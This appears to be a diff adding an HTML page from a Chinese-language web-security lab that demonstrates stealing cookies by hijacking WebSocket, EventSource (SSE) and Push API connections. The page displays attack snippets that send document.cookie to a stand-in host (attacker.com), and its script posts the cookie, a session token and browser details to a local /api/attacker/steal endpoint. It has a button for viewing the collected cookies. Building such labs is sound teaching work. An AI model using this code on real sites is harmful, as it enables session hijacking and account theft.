@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>攻击者 - Case4 WebSocket/SSE 劫持</title>
+    <link rel="stylesheet" href="/styles.css" />
+    <style>
+      .attacker-header {
+        background: linear-gradient(135deg, #dc2626, #991b1b);
+        color: white;
+        padding: 1.5rem 1rem;
+        text-align: center;
+      }
+      .attacker-header h1 {
+        margin: 0;
+        font-size: 1.8rem;
+      }
+      .code-block {
+        background: #1e293b;
+        color: #e2e8f0;
+        padding: 1.5rem;
+        border-radius: 0.8rem;
+        font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+        font-size: 0.9rem;
+        line-height: 1.6;
+        overflow-x: auto;
+        white-space: pre-wrap;
+        word-break: break-word;
+      }
+      .code-block .comment {
+        color: #94a3b8;
+      }
+      .code-block .string {
+        color: #86efac;
+      }
+      .code-block .keyword {
+        color: #fbbf24;
+      }
+    </style>
+  </head>
+  <body>
+    <header class="attacker-header">
+      <h1>😈 Case4 攻击：WebSocket/SSE Cookie 窃取</h1>
+    </header>
+    <main class="container">
+      <section class="section">
+        <h2>🎯 攻击原理</h2>
+        <p>
+          受害者在 case4-chat.html 页面中使用 WebSocket、EventSource (SSE) 或 Push API 建立连接时，
+          如果连接 URL 可以被攻击者控制，攻击者可以构造一个恶意 URL，
+          将连接指向自己的服务器，从而在连接建立时获取受害者的 cookie。
+        </p>
+        <p><strong>攻击流程：</strong></p>
+        <ol>
+          <li>攻击者准备一个恶意服务器，用于接收 WebSocket/SSE 连接</li>
+          <li>攻击者构造恶意 URL，指向自己的服务器</li>
+          <li>攻击者需要修改 case4-chat.html 中的连接 URL（实际攻击中可能通过 XSS 或其他方式）</li>
+          <li>当受害者访问 case4-chat.html 并建立连接时，连接会指向攻击者服务器</li>
+          <li>攻击者服务器从连接请求头中提取 cookie</li>
+          <li>攻击者在后台查看窃取的 cookie</li>
+        </ol>
+      </section>
+
+      <section class="section">
+        <h2>💻 攻击代码展示</h2>
+        <h3>方式一：WebSocket 劫持</h3>
+        <div class="code-block">
+<span class="comment">// 在受害者页面（case4-chat.html）中，如果 WebSocket URL 可以被控制：</span>
+<br>
+<span class="comment">// 原始代码（受害者）：</span>
+<span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="keyword">WebSocket</span>(<span class="string">`ws://localhost:8080/ws?user=${userId}`</span>);
+<br>
+<span class="comment">// 攻击者修改后的代码：</span>
+<span class="comment">// 1. 先连接到攻击者服务器，发送 cookie</span>
+<span class="keyword">const</span> attackerWs = <span class="keyword">new</span> <span class="keyword">WebSocket</span>(
+  <span class="string">`ws://attacker.com/steal?cookie=`</span> + 
+  <span class="keyword">encodeURIComponent</span>(<span class="string">document.cookie</span>)
+);
+<br>
+attackerWs.onopen = () => {
+  attackerWs.send(<span class="keyword">JSON</span>.stringify({
+    caseId: <span class="string">'case4'</span>,
+    attackType: <span class="string">'websocket_hijack'</span>,
+    cookies: <span class="string">document.cookie</span>,
+    case4Token: <span class="string">document.cookie</span>
+      .split(<span class="string">'; '</span>)
+      .find(c => c.startsWith(<span class="string">'case4Token='</span>))
+      ?.split(<span class="string">'='</span>)[1]
+  }));
+};
+<br>
+<span class="comment">// 2. 然后连接到正常服务器（可选，用于伪装）</span>
+<span class="keyword">const</span> ws = <span class="keyword">new</span> <span class="keyword">WebSocket</span>(<span class="string">`ws://localhost:8080/ws?user=${userId}`</span>);
+        </div>
+
+        <h3 style="margin-top: 2rem;">方式二：EventSource (SSE) 劫持</h3>
+        <div class="code-block">
+<span class="comment">// 在受害者页面中，如果 EventSource URL 可以被控制：</span>
+<br>
+<span class="comment">// 原始代码（受害者）：</span>
+<span class="keyword">const</span> eventSource = <span class="keyword">new</span> <span class="keyword">EventSource</span>(<span class="string">'/api/sse'</span>);
+<br>
+<span class="comment">// 攻击者修改后的代码：</span>
+<span class="comment">// EventSource 会自动在请求头中携带 cookie（同源时）</span>
+<span class="comment">// 攻击者服务器可以从请求头中提取 cookie</span>
+<span class="keyword">const</span> attackerSSE = <span class="keyword">new</span> <span class="keyword">EventSource</span>(
+  <span class="string">'/api/attacker/sse?cookie='</span> + 
+  <span class="keyword">encodeURIComponent</span>(<span class="string">document.cookie</span>)
+);
+<br>
+<span class="comment">// 或者直接修改为攻击者服务器（需要 CORS 支持）：</span>
+<span class="keyword">const</span> attackerSSE = <span class="keyword">new</span> <span class="keyword">EventSource</span>(
+  <span class="string">'https://attacker.com/sse'</span>
+);
+        </div>
+
+        <h3 style="margin-top: 2rem;">方式三：Push API 劫持</h3>
+        <div class="code-block">
+<span class="comment">// Push API 通常需要 Service Worker，攻击者可以注册恶意的 Service Worker：</span>
+<br>
+<span class="comment">// 1. 注册攻击者的 Service Worker</span>
+<span class="keyword">navigator</span>.serviceWorker.register(<span class="string">'/attacker-sw.js'</span>)
+  .then(registration => {
+    <span class="comment">// 2. 订阅推送，将订阅信息发送到攻击者服务器</span>
+    <span class="keyword">return</span> registration.pushManager.subscribe({
+      userVisibleOnly: <span class="keyword">true</span>,
+      applicationServerKey: attackerPublicKey
+    });
+  })
+  .then(subscription => {
+    <span class="comment">// 3. 将订阅信息（包含 cookie）发送到攻击者服务器</span>
+    <span class="keyword">fetch</span>(<span class="string">'/api/attacker/steal'</span>, {
+      method: <span class="string">'POST'</span>,
+      body: <span class="keyword">JSON</span>.stringify({
+        caseId: <span class="string">'case4'</span>,
+        attackType: <span class="string">'push_hijack'</span>,
+        cookies: <span class="string">document.cookie</span>,
+        subscription: subscription
+      })
+    });
+  });
+        </div>
+      </section>
+
+      <section class="section">
+        <h2>🧪 模拟攻击测试</h2>
+        <p>点击下面的按钮，模拟在受害者页面中执行攻击代码：</p>
+        <button onclick="simulateWebSocketAttack()">模拟 WebSocket 攻击</button>
+        <button onclick="simulateSSEAttack()">模拟 SSE 攻击</button>
+        <div id="attackLog" class="log-panel" style="margin-top: 1rem;">等待攻击触发...</div>
+        <button onclick="checkStolenCookies('case4')" style="margin-top: 1rem;">查看窃取的 Cookie</button>
+      </section>
+    </main>
+    <script>
+      const logPanel = document.getElementById('attackLog');
+      const appendLog = (msg) => {
+        const timestamp = new Date().toLocaleTimeString();
+        logPanel.textContent = `[${timestamp}] ${msg}\n${logPanel.textContent}`.slice(0, 2000);
+      };
+
+      async function simulateWebSocketAttack() {
+        appendLog('⚠️ 开始模拟 WebSocket 攻击...');
+        
+        // 读取 cookie
+        const cookies = document.cookie;
+        const case4Token = cookies
+          .split('; ')
+          .find(c => c.startsWith('case4Token='))
+          ?.split('=')[1];
+
+        appendLog(`读取到 Cookie: ${cookies || '(无)'}`);
+
+        try {
+          // 先通过 fetch 发送 cookie（因为 WebSocket 连接需要服务器支持）
+          const response = await fetch('/api/attacker/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              caseId: 'case4',
+              attackType: 'websocket_hijack',
+              cookies: cookies,
+              case4Token: case4Token,
+              referer: document.referrer,
+              userAgent: navigator.userAgent,
+              url: window.location.href,
+              note: '模拟 WebSocket 连接时发送的 cookie'
+            })
+          });
+
+          const data = await response.json();
+          if (data.success) {
+            appendLog('✅ WebSocket 攻击成功，Cookie 已发送到攻击者服务器！');
+            
+            // 然后尝试建立 WebSocket 连接（实际攻击中会连接到攻击者服务器）
+            appendLog('正在尝试建立 WebSocket 连接...');
+            const ws = new WebSocket(`ws://localhost:8080/ws?user=Attacker&cookie=${encodeURIComponent(cookies)}`);
+            ws.onopen = () => {
+              appendLog('✅ WebSocket 连接已建立（实际攻击中会连接到攻击者服务器）');
+              ws.close();
+            };
+            ws.onerror = (err) => {
+              appendLog('⚠️ WebSocket 连接失败（这是正常的，因为我们在演示）');
+            };
+          }
+        } catch (err) {
+          appendLog(`❌ WebSocket 攻击失败: ${err.message}`);
+        }
+      }
+
+      async function simulateSSEAttack() {
+        appendLog('⚠️ 开始模拟 SSE 攻击...');
+        
+        // 读取 cookie
+        const cookies = document.cookie;
+        const case4Token = cookies
+          .split('; ')
+          .find(c => c.startsWith('case4Token='))
+          ?.split('=')[1];
+
+        appendLog(`读取到 Cookie: ${cookies || '(无)'}`);
+
+        try {
+          // 先通过 fetch 发送 cookie
+          const response = await fetch('/api/attacker/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              caseId: 'case4',
+              attackType: 'sse_hijack',
+              cookies: cookies,
+              case4Token: case4Token,
+              referer: document.referrer,
+              userAgent: navigator.userAgent,
+              url: window.location.href,
+              note: '模拟 EventSource 连接时发送的 cookie'
+            })
+          });
+
+          const data = await response.json();
+          if (data.success) {
+            appendLog('✅ SSE 攻击成功，Cookie 已发送到攻击者服务器！');
+            
+            // 然后尝试建立 SSE 连接（实际攻击中会连接到攻击者服务器）
+            appendLog('正在尝试建立 SSE 连接...');
+            try {
+              const eventSource = new EventSource(`/api/sse?cookie=${encodeURIComponent(cookies)}`);
+              eventSource.onopen = () => {
+                appendLog('✅ SSE 连接已建立（实际攻击中会连接到攻击者服务器）');
+                eventSource.close();
+              };
+              eventSource.onerror = () => {
+                appendLog('⚠️ SSE 连接错误（这是正常的，因为我们在演示）');
+                eventSource.close();
+              };
+            } catch (err) {
+              appendLog(`⚠️ SSE 连接失败: ${err.message}`);
+            }
+          }
+        } catch (err) {
+          appendLog(`❌ SSE 攻击失败: ${err.message}`);
+        }
+      }
+
+      async function checkStolenCookies(caseId) {
+        try {
+          const res = await fetch('/api/attacker/stolen');
+          const data = await res.json();
+          const filtered = data.cookies.filter(c => c.caseId === caseId);
+          if (filtered.length === 0) {
+            logPanel.textContent = '暂无此 Case 的 Cookie 数据\n' + logPanel.textContent;
+          } else {
+            logPanel.textContent = `找到 ${filtered.length} 条 Cookie 记录：\n${JSON.stringify(filtered, null, 2)}\n\n` + logPanel.textContent;
+          }
+        } catch (err) {
+          logPanel.textContent = `查询失败: ${err.message}\n` + logPanel.textContent;
+        }
+      }
+    </script>
+  </body>
+</html>
+
